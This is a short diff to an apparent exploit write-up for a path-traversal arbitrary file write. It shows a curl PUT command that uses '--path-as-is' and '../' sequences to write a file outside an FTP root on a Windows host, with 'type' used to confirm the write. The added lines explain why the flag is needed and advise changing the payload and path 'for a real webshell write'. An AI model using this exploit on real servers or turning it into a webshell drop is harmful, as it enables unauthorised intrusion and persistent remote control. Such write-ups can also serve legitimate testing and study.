@@ -35,6 +35,7 @@ curl -k -X PUT -H "Host: <IP>" \
   --data-binary "PoC." \
   --path-as-is https://<IP>/../../../../../../whoops
 ```
+> Replace `<IP>`, `<username>`, and `<password>` with target values. `--path-as-is` is REQUIRED — without it, curl collapses the `../` sequences and the traversal fails. Change `--data-binary` content and the destination path for a real webshell write.
 
 ### Flag Breakdown
 
@@ -53,6 +54,7 @@ curl -k -X PUT -H "Host: <IP>" \
 C:\> type C:\whoops
 PoC.
 ```
+> `type` is the Windows equivalent of `cat`. If the file exists at `C:\whoops` with content `PoC.`, the path traversal worked. This confirms arbitrary file write outside the FTP root.
 
 ---
 
